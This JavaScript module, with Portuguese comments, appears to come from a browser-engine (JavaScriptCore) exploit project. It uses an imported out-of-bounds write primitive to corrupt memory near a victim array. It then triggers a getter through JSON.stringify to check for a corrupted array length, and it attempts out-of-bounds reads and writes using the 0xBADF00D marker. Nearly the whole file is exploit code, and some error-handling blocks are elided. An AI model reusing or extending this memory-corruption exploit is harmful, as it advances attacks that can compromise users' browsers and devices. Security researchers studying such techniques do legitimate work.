// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForArrayLengthCorruption";
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null, details: ""
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Array vítima que será verificado no getter
let array_victim_for_length_test; 
const VICTIM_ARRAY_ORIGINAL_LENGTH = 16;

class CheckpointForArrayLengthTest {
    constructor(id) {
        this.id_marker = `ArrayLengthTestCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "ArrayLengthCorruption_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = {
            success: false, message: "Getter chamado, verificando corrupção de length do array vítima.",
            error: null, details: ""
        };
        let details_log = [];

        try {
            if (!array_victim_for_length_test) {
                throw new Error("array_victim_for_length_test não está definido no getter!");
            }

            const current_length = array_victim_for_length_test.length;
            details_log.push(`array_victim.length atual: ${current_length} (Original esperado: ${VICTIM_ARRAY_ORIGINAL_LENGTH})`);
            logS3(`DENTRO DO GETTER: Verificando array_victim_for_length_test. Length atual: ${current_length}`, "info", FNAME_GETTER);

            if (current_length !== VICTIM_ARRAY_ORIGINAL_LENGTH) {
                logS3(`DENTRO DO GETTER: CORRUPÇÃO DE LENGTH DETECTADA! Length é ${current_length}, esperado ${VICTIM_ARRAY_ORIGINAL_LENGTH}!`, "vuln", FNAME_GETTER);
                current_test_results.success = true;
                current_test_results.message = `Corrupção de length detectada! Length: ${current_length}.`;
                details_log.push(`CORRUPÇÃO DE LENGTH!`);

                // Tentar ler/escrever OOB se o length for maior
                if (current_length > VICTIM_ARRAY_ORIGINAL_LENGTH) {
                    const oob_idx = VICTIM_ARRAY_ORIGINAL_LENGTH + 10; // Um índice OOB
                    if (oob_idx < current_length) { // Verifica se o índice OOB ainda está dentro do length corrompido
                        try {
                            let oob_val_before = array_victim_for_length_test[oob_idx];
                            details_log.push(`Leitura OOB de array_victim[${oob_idx}] ANTES da escrita: ${String(oob_val_before)} (tipo: ${typeof oob_val_before})`);
                            logS3(details_log[details_log.length-1], "leak", FNAME_GETTER);

                            array_victim_for_length_test[oob_idx] = 0xBADF00D; // Escrita OOB
                            let oob_val_after = array_victim_for_length_test[oob_idx];
                            details_log.push(`Leitura OOB de array_victim[${oob_idx}] APÓS escrita de 0xBADF00D: ${String(oob_val_after)} (tipo: ${typeof oob_val_after})`);
                            logS3(details_log[details_log.length-1], "leak", FNAME_GETTER);

                            if (oob_val_after === 0xBADF00D) {
                                current_test_results.message += " Leitura/Escrita OOB no array com length corrompido FUNCIONOU!";
                                logS3("LEITURA/ESCRITA OOB NO ARRAY VÍTIMA FUNCIONOU!", "vuln", FNAME_GETTER);
                            } else {
                                current_test_results.message += " Escrita OOB no array parece não ter surtido efeito esperado.";
                            }
                        } catch (e_oob_access) {
                            details_log.push(`Erro ao tentar R/W OOB no array vítima: ${e_oob_access.message}`);
                            logS3(`Erro ao tentar R/W OOB no array vítima: ${e_oob_access.message}`, "error", FNAME_GETTER);
                        }
                    }
                }
            } else {
                current_test_results.message = "Nenhuma corrupção de length detectada no array vítima.";
                logS3(`DENTRO DO GETTER: Length do array vítima (${current_length}) parece normal.`, "good", FNAME_GETTER);
            }
            
            // Verificar se os elementos originais foram corrompidos
            let elements_corrupted = false;
            for(let i=0; i < VICTIM_ARRAY_ORIGINAL_LENGTH; i++){
                if(i < current_length && array_victim_for_length_test[i] !== (0x41410000 + i)){
                    details_log.push(`Elemento original array_victim[${i}] corrompido: ${array_victim_for_length_test[i]} vs ${0x41410000 + i}`);
                    elements_corrupted = true;
                }
            }
            if(elements_corrupted){
                logS3("CORRUPÇÃO DE ELEMENTOS ORIGINAIS DETECTADA NO ARRAY VÍTIMA!", "vuln", FNAME_GETTER);
                if(!current_test_results.success) current_test_results.message += "; Corrupção de elementos detectada.";
                current_test_results.success = true;
            }


        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        current_test_results.details = details_log.join('; ');
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForArrayLengthTest.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_array_length_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST_RUNNER = "executeArrayLengthCorruptionTestRunner";
    logS3(`--- Iniciando Teste de Corrupção de Length de Array ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial */ };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // 1. Criar o Array Vítima ANTES da escrita OOB gatilho
        array_victim_for_length_test = new Array(VICTIM_ARRAY_ORIGINAL_LENGTH);
        for(let i=0; i< VICTIM_ARRAY_ORIGINAL_LENGTH; i++) array_victim_for_length_test[i] = 0x41410000 + i; // Preencher com padrão
        logS3(`Array vítima criado com length ${array_victim_for_length_test.length}. Conteúdo[0]=${toHex(array_victim_for_length_test[0])}`, "info", FNAME_TEST_RUNNER);

        // 2. Escrita OOB Gatilho
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        // 3. Criar o objeto Checkpoint e chamar JSON.stringify
        const checkpoint_obj = new CheckpointForArrayLengthTest(1);
        logS3(`CheckpointForArrayLengthTest objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { /* ... */ }

    } catch (mainError) { /* ... */ }
    finally { /* ... */ }

    // Log dos resultados
    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE ARRAY LENGTH CORRUPTION: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE ARRAY LENGTH CORRUPTION: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da inspeção: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
         if (current_test_results.error) {
            logS3(`  Erro reportado no getter: ${current_test_results.error}`, "error", FNAME_TEST_RUNNER);
        }
    } else {
        logS3("RESULTADO TESTE ARRAY LENGTH CORRUPTION: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
    }

    clearOOBEnvironment();
    array_victim_for_length_test = null; // Limpar referência
    logS3(`--- Teste de Corrupção de Length de Array Concluído ---`, "test", FNAME_TEST_RUNNER);
}
